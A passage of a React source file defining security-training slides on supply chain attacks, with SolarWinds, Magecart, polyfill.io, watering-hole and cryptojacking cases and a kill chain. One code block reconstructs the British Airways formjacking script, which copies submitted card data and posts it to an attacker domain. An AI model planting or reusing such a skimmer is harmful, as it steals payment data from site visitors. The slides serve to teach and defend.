        <div className="illustration">
          <div className="illustration-label">Why every defense layer failed</div>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'Code Review', desc: 'Repo was clean', type: '' },
              { label: 'Tests', desc: 'All passed', type: '' },
              { label: 'Antivirus', desc: 'Signed = trusted', type: '' },
              { label: 'Firewall', desc: 'Traffic looked normal', type: '' },
              { label: 'RESULT', desc: 'Undetected for 9 months', type: 'attacker' },
            ]} />
          </div>
        </div>

        <div className="slide-grid">
          <div className="slide-grid-item">
            <h4>18,000+</h4>
            <p>Organizations installed the trojanized update &mdash; including the <strong>US Treasury</strong>, <strong>Homeland Security</strong>, the Pentagon, and <strong>Microsoft</strong>.</p>
          </div>
          <div className="slide-grid-item">
            <h4>~100 Exploited</h4>
            <p>Around 100 high-value targets were <strong>hand-picked for deeper espionage</strong>. The rest served as cover &mdash; hiding in the noise of a massive install base.</p>
          </div>
          <div className="slide-grid-item">
            <h4>9 Months</h4>
            <p>The backdoor operated from <strong>March to December 2020</strong>. Nine months of access to the US government before anyone noticed.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Caught by Accident</h4>
            <p>FireEye (now Mandiant) noticed someone stole <em>their</em> red-team tools. Investigating their own breach, they traced it to a SolarWinds update. <strong>Without this accident, it could have lasted years.</strong></p>
          </div>
        </div>

        <div className="slide-quote">
          The nightmare scenario: your source code is perfect, your tests pass, your code review
          is clean &mdash; but the program your users install has a backdoor, signed with <em>your
          own certificate</em>. No developer ever saw malicious code in the repo. No amount
          of reading the source would catch this.
        </div>
      </>
    ),
  },
  {
    tag: 'Part 1 // Attack Type F',
    title: '<span class="highlight">Browser-Based</span> Supply Chain Attacks',
    content: (
      <>
        <p><strong>What is it?</strong></p>
        <ul>
          <li>Every website loads third-party JavaScript &mdash; analytics, fonts, chat widgets, CDN libraries</li>
          <li>Each one is a <strong>potential supply chain attack vector</strong></li>
          <li>If any script is compromised &rarr; <em>every visitor</em> to your site becomes a victim</li>
        </ul>

        <div className="illustration">
          <div className="illustration-label">Browser-based attack flow</div>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'Attacker', desc: 'Compromises JS lib or extension', type: 'attacker', arrowType: 'danger' },
              { label: 'CDN / Store', desc: 'Serves malicious code', type: 'compromised', arrowType: 'danger' },
              { label: 'User Browser', desc: 'Auto-executes script', type: 'victim', arrowType: 'danger' },
              { label: 'Stolen Data', desc: 'Cookies, sessions, keystrokes', type: 'attacker' },
            ]} />
          </div>
        </div>

        <div className="slide-grid">
          <div className="slide-grid-item">
            <h4>Magecart / Formjacking</h4>
            <ul>
              <li><strong>British Airways (2018)</strong> &mdash; Magecart Group 6 injected <strong>22 lines</strong> of JS into BA&apos;s payment page</li>
              <li>For <strong>15 days</strong>, every credit card on ba.com was silently copied to the attacker&apos;s server</li>
              <li><strong>380,000 transactions</strong> compromised &rarr; BA fined <strong>&pound;20 million</strong></li>
              <li>The script was just a modified version of the Modernizr library already on the page</li>
            </ul>
          </div>
          <div className="slide-grid-item">
            <h4>polyfill.io (2024)</h4>
            <ul>
              <li>Trusted CDN used by <strong>100,000+ websites</strong> to serve JS polyfills</li>
              <li>A Chinese company (Funnull) <strong>bought the domain</strong></li>
              <li>Started injecting <strong>malicious redirects</strong> &rarr; users sent to betting/scam sites</li>
              <li>Websites loading the script had <strong>no idea</strong></li>
              <li>Google blocked ads on affected sites; Cloudflare &amp; Fastly created emergency mirrors</li>
            </ul>
          </div>
          <div className="slide-grid-item">
            <h4>Watering Hole</h4>
            <ul>
              <li><strong>SolarWinds follow-up (2020-21)</strong> &mdash; attackers also compromised a government contractor&apos;s website</li>
              <li>USAID employees who visited were served a <strong>zero-day exploit</strong></li>
              <li>Classic watering hole &mdash; compromise the place your targets <strong>already visit</strong>, instead of attacking them directly</li>
            </ul>
          </div>
          <div className="slide-grid-item">
            <h4>Cryptojacking</h4>
            <ul>
              <li><strong>Coinhive (2017-2019)</strong> &mdash; &ldquo;legitimate&rdquo; browser mining service, overwhelmingly used for cryptojacking</li>
              <li>Injected into <strong>.gov.uk</strong>, <strong>uscourts.gov</strong>, pirate sites, WordPress plugins</li>
              <li>Found on <strong>30,000+ websites</strong> at peak</li>
              <li>Visitors&apos; CPUs mined Monero for attackers while pages loaded slowly</li>
            </ul>
          </div>
        </div>

        <CodeBlock
          language="html"
          filename="British Airways formjacking (simplified)"
          code={`<!-- The original BA payment page loaded Modernizr normally.
     Attackers modified it to also run this: -->
<script>
document.getElementById('checkout')
  .addEventListener('submit', function(e) {
    // Grab card details the user just typed
    var cardData = new FormData(e.target);
    // Send a copy to attacker's server (baways.com — NOT ba.com!)
    fetch('https://baways.com/gateway/app/data498', {
      method: 'POST',
      body: cardData
    });
    // Original form submission continues normally
    // User has no idea their card was just stolen
  });
</script>
<!-- 380,000 cards stolen. £20M fine. 22 lines of code. -->`}
        />
      </>
    ),
  },
  {
    tag: 'Part 1 // Kill Chain',
    title: 'Supply Chain Attack <span class="highlight">Kill Chain</span>',
    content: (
      <div className="killchain">
        <div className="killchain-step">
          <div className="killchain-num">PHASE 01</div>
          <h4>Recon</h4>
          <p>Discover dependencies, internal names, CI/CD tools</p>
        </div>
        <div className="killchain-step">
          <div className="killchain-num">PHASE 02</div>
          <h4>Compromise</h4>
          <p>Steal credentials, create typosquat, social engineer</p>
        </div>
        <div className="killchain-step">
          <div className="killchain-num">PHASE 03</div>
          <h4>Injection</h4>
          <p>Insert payload into package, action, or build</p>
        </div>
        <div className="killchain-step">
          <div className="killchain-num">PHASE 04</div>
          <h4>Distribution</h4>
          <p>Flows through trusted update channels</p>
        </div>
        <div className="killchain-step">
          <div className="killchain-num">PHASE 05</div>
          <h4>Activation</h4>
          <p>Install hooks, runtime, or delayed trigger</p>
        </div>
        <div className="killchain-step">
          <div className="killchain-num">PHASE 06</div>
          <h4>Exploitation</h4>
          <p>Exfil data, backdoors, lateral movement</p>
        </div>
      </div>
    ),
  },
  {
    tag: 'Part 1 // Comparison',
    title: 'Attack Type <span class="highlight">Comparison Matrix</span>',
    content: (
      <table className="slide-table">
        <thead>
          <tr>
            <th>Attack Type</th>
            <th>Difficulty</th>
            <th>Detection</th>
            <th>Impact</th>
            <th>Example</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>Dependency Confusion</td><td>Low</td><td>Medium</td><td>High</td><td>Birsan (2021)</td>
          </tr>
          <tr>
            <td>Typosquatting</td><td>Very Low</td><td>Easy</td><td>Medium</td><td>crossenv</td>
          </tr>
          <tr>
            <td>Compromised Package</td><td>Medium</td><td>Hard</td><td>Very High</td><td>event-stream</td>
          </tr>
          <tr>
            <td>CI/CD Pipeline</td><td>Medium</td><td>Hard</td><td>Very High</td><td>tj-actions (2025)</td>
          </tr>
          <tr>
            <td>Build Compromise</td><td>Very High</td><td>Very Hard</td><td>Catastrophic</td><td>SolarWinds</td>
          </tr>
          <tr>
            <td>Magecart / Formjacking</td><td>Medium</td><td>Medium</td><td>High</td><td>British Airways</td>
          </tr>
          <tr>
            <td>Watering Hole</td><td>Medium</td><td>Hard</td><td>High</td><td>Gov sites</td>
          </tr>
          <tr>
            <td>Cryptojacking</td><td>Low</td><td>Easy</td><td>Low-Med</td><td>Coinhive scripts</td>
          </tr>
        </tbody>
      </table>
    ),
  },
  {
    tag: 'Part 1 // Video Explainers',
    title: 'Watch: <span class="highlight">Supply Chain Attacks</span> Explained',
    content: (
      <div className="video-grid">
        <YouTubeEmbed
          id="qmXcMACowR4"
          caption='The "Largest Supply Chain Attack Ever" — npm Chalk/Debug compromise (2025)'
        />
        <YouTubeEmbed
          id="MV0XJQf8tT0"
          caption="Dependency Confusion Explained — how version resolution is exploited"
        />
        <YouTubeEmbed
          id="cvumD7bhLWU"
          caption="event-stream: Analysis of a compromised npm package"
        />
        <YouTubeEmbed
          id="7ZcRNvmRz6E"
          caption="How To Find Dependency Confusion in Web Apps — Bug Bounty"
        />
      </div>
    ),
  },
  {
    tag: 'Part 1 // Summary',
    title: 'Key <span class="highlight">Takeaways</span>',
    content: (
      <>
        <div className="slide-grid">
          <div className="slide-grid-item">
            <h4>Trust is the Vulnerability</h4>
            <p>Supply chain attacks exploit the trust developers place in dependencies, tools, and infrastructure.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Massive Blast Radius</h4>
            <p>A single compromised component can cascade to millions of downstream systems.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Detection is Hard</h4>
            <p>Malicious code arrives through legitimate, signed, trusted channels.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Defense in Depth</h4>
            <p>No single measure prevents all attacks. Layered defense is essential.</p>
          </div>
        </div>
        <div className="slide-quote">
          As perimeter security improves, attackers increasingly target the supply chain.
          This is the present and future of cyberattacks.
        </div>
      </>
    ),
  },
];

export default function Theory() {
  return <SlidePresenter slides={slides} />;
}
